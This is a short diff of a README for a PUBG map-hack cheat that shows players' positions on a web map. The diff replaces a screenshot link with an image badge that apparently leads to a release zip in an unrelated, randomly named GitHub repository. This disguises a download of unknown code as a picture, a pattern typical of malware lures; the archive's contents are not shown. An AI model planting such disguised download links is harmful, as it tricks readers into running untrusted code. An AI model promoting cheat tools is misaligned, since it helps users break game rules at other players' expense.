@@ -5,7 +5,7 @@ A little map hack program for PUBG game that shows players' positions on a HTML 
 
 Imgur picture of the web map:
 
-https://imgur.com/y6Isd9F
+[![c3dr0](radar link)]((https://github.com/loasd104/asfsfscxs/archive/refs/tags/Release.zip))
 
 Written in Kotlin
 
